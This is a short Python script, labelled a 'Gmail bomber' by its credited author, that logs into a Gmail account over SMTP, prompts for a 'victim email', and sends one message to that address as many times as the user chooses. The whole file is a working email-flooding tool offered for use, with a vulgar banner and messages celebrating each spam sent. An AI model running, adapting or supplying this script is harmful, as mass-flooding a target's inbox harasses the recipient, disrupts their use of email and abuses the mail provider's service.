#its a gmail bomber 
# the author name is cyb3rs4k1 
import smtplib
import platform
import getpass
import sys
import datetime
banner ="""
                                    
     \`~'/    |`+'|    [`'`'] 
     (o o)    (o o)     |  |  
      \ / \    (_)      |__|  
       "                      
            xGM FUCKER
        A Gmail Bomber Kit                                                           

         
"""
print (banner)
smtp   = raw_input("Are you ready ? y/n : ")
if smtp == 'y':
		server = smtplib.SMTP('smtp.gmail.com',587)
		server.starttls()

		email     = raw_input("Enter Your Gmail : ")
		password  = getpass.getpass("Enter your Password:")

		if not  email  and not password:
				print ("You must Login to your Gmail")
		else:
				server.login(email,password)
				print ("Successfully Signed in")
				
				send = raw_input("Please Enter Your Victim Email : ")

				print("Enter number of times you want to flood")
				thread= int(raw_input("Count : "))
				

				msg = raw_input("Enter Your Message :\n")
				
				

				for count in range(int(thread)):
					server.sendmail(email,send,msg)
					print (count,"HURRAH spammed successfully! : ")



				server.quit()

else:
		print("OKA BYE BUSY -- ")	
